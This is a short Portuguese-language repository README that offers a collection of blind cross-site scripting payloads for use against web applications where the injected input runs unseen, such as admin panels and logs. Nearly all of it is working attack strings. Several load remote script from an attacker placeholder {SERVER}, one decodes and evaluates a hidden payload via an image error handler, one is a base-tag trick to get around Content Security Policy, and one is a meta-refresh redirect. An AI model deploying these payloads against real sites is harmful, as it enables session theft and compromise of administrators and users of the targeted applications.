# Blind XSS Payloads
Este repositório contém uma coleção de **payloads para Blind XSS**, úteis para explorar vulnerabilidades onde a injeção ocorre em um ambiente onde a execução do código pode não ser imediatamente visível para o atacante. Blind XSS é frequentemente utilizado em aplicações onde os dados injetados são processados em segundo plano, como painéis administrativos ou logs internos.

## Payloads
```html
<!-- Basic blind XSS payload that loads an external script -->
"><script src="{SERVER}/script.js"></script>


<!-- Image tag -->
"><img src="x" onerror="eval(atob(this.id))" id="{PAYLOAD}">


<!-- In case jQuery is loaded, we can make use of the getScript method -->
"><script>$.getScript("{SERVER}")</script>


<!-- Bypass certain Content Security Policy (CSP) restrictions with a base tag -->
<base href="{SERVER}" />


<!-- Make use of the meta-tag to initiate a redirect -->
<meta http-equiv="refresh" content="0; url={SERVER}" />


## By: IvarSatierf
